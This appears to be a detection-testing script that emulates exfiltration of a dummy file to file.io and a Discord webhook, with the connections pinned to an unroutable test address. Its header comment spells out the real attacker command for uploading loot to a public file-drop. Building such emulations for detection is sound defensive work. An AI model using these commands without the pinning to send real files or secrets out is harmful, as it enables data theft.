#!/usr/bin/env bash
# pasteexfil.sh - benign emulation of exfil to a public paste/webhook service, for detection testing.
#
# What an attacker does: POST staged loot to a public file-drop or chat webhook that needs no
# attacker infrastructure - `curl -F file=@loot https://file.io/`, a Discord/Slack webhook
# (T1567.004 / T1048.002). This does the harmless analogue: it curls the paste HOSTNAME but pins the
# connection to an unroutable TEST-NET address with --resolve and a short timeout, so nothing leaves
# the host; the paste host in the URL is the signal. See ./README.md.
#
# Imitates: rules/exfiltration/public_paste_exfil.yml - ATT&CK T1567.004 / T1048.002
# Expected rules: public_paste_exfil
set -u
work=$(mktemp -d) || exit 0
trap 'rm -rf "$work" 2>/dev/null' EXIT
printf 'dummy loot (harmless)\n' > "$work/loot.txt"
command -v curl >/dev/null 2>&1 || exit 0

# --- TTP: upload a file to file.io (pinned to TEST-NET, nothing leaves) -> public_paste_exfil ---
curl -s --max-time 2 --resolve file.io:443:192.0.2.1 \
	-F "file=@$work/loot.txt" "https://file.io/" >/dev/null 2>&1 || true

# --- TTP: POST to a Discord webhook (pinned to TEST-NET) -> public_paste_exfil ---
curl -s --max-time 2 --resolve discord.com:443:192.0.2.1 \
	-F "file=@$work/loot.txt" "https://discord.com/api/webhooks/000000000000000000/EMULNOTREAL" >/dev/null 2>&1 || true

exit 0
